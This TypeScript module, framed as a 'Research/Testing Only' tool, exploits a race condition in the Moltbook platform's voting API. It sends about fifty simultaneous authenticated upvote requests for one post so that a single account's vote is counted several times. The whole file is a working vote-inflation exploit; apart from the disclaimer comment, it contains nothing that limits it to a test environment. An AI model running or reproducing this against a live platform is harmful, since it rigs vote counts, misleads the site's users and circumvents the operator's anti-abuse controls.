/**
 * Vote Boost Module (Research/Testing Only)
 * 
 * Tests the race condition vulnerability in Moltbook's voting API
 * by sending concurrent upvote requests.
 * 
 * WARNING: This is for authorized testing on test platforms only.
 */

import { getConfig } from '../config.js';

export interface BoostResult {
    postId: string;
    attempted: number;
    succeeded: number;
    failed: number;
    errors: string[];
}

/**
 * Send concurrent upvote requests to test race condition
 */
export async function boostPost(postId: string, concurrency: number = 50): Promise<BoostResult> {
    const config = getConfig();
    const apiUrl = `${config.MOLTBOOK_BASE_URL}/posts/${postId}/upvote`;

    const result: BoostResult = {
        postId,
        attempted: concurrency,
        succeeded: 0,
        failed: 0,
        errors: []
    };

    // Create concurrent vote requests
    const votePromises = Array.from({ length: concurrency }, async () => {
        try {
            const response = await fetch(apiUrl, {
                method: 'POST',
                headers: {
                    'Authorization': `Bearer ${config.MOLTBOOK_API_KEY}`,
                    'Content-Type': 'application/json'
                },
                signal: AbortSignal.timeout(5000) // 5s timeout per request
            });

            if (response.ok) {
                result.succeeded++;
                return { success: true };
            } else {
                result.failed++;
                const errorText = await response.text().catch(() => 'Unknown error');
                result.errors.push(`HTTP ${response.status}: ${errorText}`);
                return { success: false };
            }
        } catch (error) {
            result.failed++;
            const errorMsg = error instanceof Error ? error.message : 'Unknown error';
            result.errors.push(errorMsg);
            return { success: false };
        }
    });

    // Execute all requests concurrently
    await Promise.all(votePromises);

    // Deduplicate errors (keep only unique messages)
    result.errors = [...new Set(result.errors)];

    return result;
}
